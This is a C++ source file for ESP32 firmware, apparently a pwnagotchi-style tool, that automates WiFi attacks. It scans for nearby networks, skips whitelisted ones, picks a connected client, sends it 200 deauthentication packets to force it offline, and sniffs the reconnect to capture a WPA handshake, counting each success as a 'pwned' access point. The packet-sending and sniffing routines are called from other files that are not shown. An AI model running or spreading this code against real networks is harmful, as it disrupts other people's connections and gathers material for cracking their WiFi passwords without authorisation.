#include "pwnagothi.h"
#include "WiFi.h"
#include "logger.h"
#include "settings.h"
#include "ArduinoJson.h"
#include "mood.h"
#include "networkKit.h"
#include "EapolSniffer.h"
#include "ui.h"
#include "src.h"

String pwnagothiWhitelist[30];
String pwnagothiMacWhitelist[30];
bool pwnagothiScan = true;
bool nextWiFiCheck = false;

TaskHandle_t pwnagothiTaskHandle = NULL;

void pwnagothiTask(void *pvParameters) {
    while (pwnagothiModeEnabled) {
        pwnagothiLoop();
    }
    vTaskDelete(NULL);
}

void startPwnagothiTask() {
    if (pwnagothiTaskHandle == NULL) {
        pwnagothiModeEnabled = true;
        xTaskCreatePinnedToCore(
            pwnagothiTask,      // Task function
            "PwnagothiTask",    // Name
            8192,               // Stack size
            NULL,               // Parameters
            1,                  // Priority
            &pwnagothiTaskHandle, // Task handle
            1                   // Core 1
        );
    }
}

void stopPwnagothiTask() {
    if (pwnagothiTaskHandle != NULL) {
        pwnagothiModeEnabled = false;
        vTaskDelete(pwnagothiTaskHandle);
        pwnagothiTaskHandle = NULL;
    }
}

bool pwnagothiBegin(){
    if(!(WiFi.mode(WIFI_MODE_STA) && WiFi.scanNetworks(true, true))){
        return false;
    }   
    WiFi.scanNetworks(true, true);
    logMessage("Pwnagothi auto mode init!");
    parseWhitelist();
    pwnagothiModeEnabled = true;
    return true;
}

void addToWhitelist(String valueToAdd){
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    for(JsonVariant v : oldArray) {
        array.add(String(v.as<const char*>()));
    }
    array.add(valueToAdd);
    serializeJson(list, whitelist);
    saveSettings();
}

String* parseWhitelist(){
    static String result[30]; // Static to persist after function ends
    StaticJsonDocument<512> jsonWhitelist;

    DeserializationError err = deserializeJson(jsonWhitelist, whitelist);
    if (err) {
        logMessage("Failed to parse whitelist JSON");
        return result;
    }

    JsonArray array = jsonWhitelist.as<JsonArray>();
    uint8_t n = 0;

    for (JsonVariant v : array) {
        if (n >= 30) break;
        logMessage("parsed whitelist item - " + String(v.as<const char*>()));
        result[n++] = String(v.as<const char*>());
    }

    return result;
}

void parseMacFromWhitelist() {
  WiFi.mode(WIFI_MODE_STA);  // ensure we can scan
  int netCount = WiFi.scanNetworks(false, true);  // block, include hidden

  for (int i = 0; i < 30; i++) {
    if (pwnagothiWhitelist[i].length() == 0) continue;  // skip unused slots

    bool found = false;
    for (int n = 0; n < netCount; n++) {
      if (WiFi.SSID(n) == pwnagothiWhitelist[i]) {
        uint8_t* mac = WiFi.BSSID(n);
        char macStr[18];
        snprintf(macStr, sizeof(macStr),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        pwnagothiMacWhitelist[i] = String(macStr);
        found = true;
        break;
      }
    }

    if (!found) {
      pwnagothiMacWhitelist[i] = "";  // mark as not found
    }
  }
}

uint8_t wifiCheckInt = 0;

void pwnagothiLoop(){
    if(pwnagothiScan){
        logMessage("(<_>) Scanning..");
        setMood(1, "(<_>)", "Scanning..");
        WiFi.scanNetworks(false);
        delayWithUI(5000);
        if((WiFi.scanComplete()) >= 0){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            logMessage("(*_*) Scan compleated proceding to attack!");
            setMood(1, "(*_*)", "Scan compleated proceding to attack!");
            delayWithUI(1000);
            return;
        }
    }
    else{
        String attackVector;
        if(!WiFi.SSID(0)){
            logMessage("('_') No networks found. Waiting and retrying");
            delayWithUI(5000);
            pwnagothiScan = true;
        }
        if(wifiCheckInt < WiFi.scanComplete()){
            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
        }
        else{
            pwnagothiScan = true;
            return;
        }
        attackVector = WiFi.SSID(wifiCheckInt);
        setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
        delayWithUI(1000);
        String* whitelistParsed = parseWhitelist();
        logMessage("Size of whiletist: " + String(sizeof(whitelistParsed)));
        for(uint16_t i = 0; i<=sizeof(whitelistParsed); i++){
            logMessage("Whietlist check...");
            if(whitelistParsed[i] == attackVector){
                setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                logMessage("(x_x) " + String("Well, ") + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                delayWithUI(5000);
                wifiCheckInt++;
                return;
            }
        }
        setMood(1, "(Y_Y)" , "I'm looking instde you " + attackVector + "...");
        set_target_channel(attackVector.c_str());
        uint8_t i = 1;
        uint8_t currentCount = SnifferGetClientCount();
        setMac(WiFi.BSSID(wifiCheckInt));
        uint8_t targetChanel = set_target_channel(attackVector.c_str());
        initClientSniffing();
        String clients[50];
        int clientLen;
        while(true){
            get_clients_list(clients, clientLen);
            if(clients[i] != ""){
                logMessage("Client count: " + String(clientLen));
                setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
                logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
                logMessage("Client BSSID is: "+ clients[clientLen]);
                logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
                delayWithUI(2000);
                //stopClientSniffing();
                esp_wifi_set_promiscuous(false);
                break;
            }
        }
        setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
        logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
        if(send_deauth_packets(clients[i], 200)){
            logMessage("Deauth succesful");
        }
        else{
            logMessage("Unknown error with deauth");
        }
        if(SnifferBegin(targetChanel)){
            logMessage("Sniffer started on channel: " + String(targetChanel));
        }
        else{
            logMessage("Sniffer failed to start on channel: " + String(targetChanel));
            setMood(1, "(x_x)", "Sniffer failed to start on channel: " + String(targetChanel));
            delayWithUI(5000);
            return;
        }
        while(true){
            SnifferLoop();
            if(SnifferGetClientCount() > currentCount){
                setMood(1, "(^_^)", "Got new handshake!!!" );
                logMessage("(^_^) Got new handshake!!!");
                SnifferEnd();
                addToWhitelist(attackVector);
                pwned_ap++;
                sessionCaptures++;
                saveSettings();
                updateActivity(true);
                break;
            }
        }
    }
}

void delayWithUI(uint16_t delayTime){
    delay(delayTime);
    // for(uint16_t timer; timer>=delayTime; timer = timer +10){
    //     updateUi(true, false);
    //     delay(10);
    // }
    //  /\
    //  |
    //Deprecated, but kept because I am lazy to remove it
}

void removeItemFromWhitelist(String valueToRemove) {
    logMessage("Removing item from whitelist: " + valueToRemove);
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    
    for (JsonVariant v : oldArray) {
        String item = String(v.as<const char*>());
        if (item != valueToRemove) {
            array.add(item);
        }
    }
    
    serializeJson(list, whitelist);
    saveSettings();
    initVars(); // Reinitialize variables to reflect changes
    logMessage("Item removed from whitelist: " + valueToRemove);
}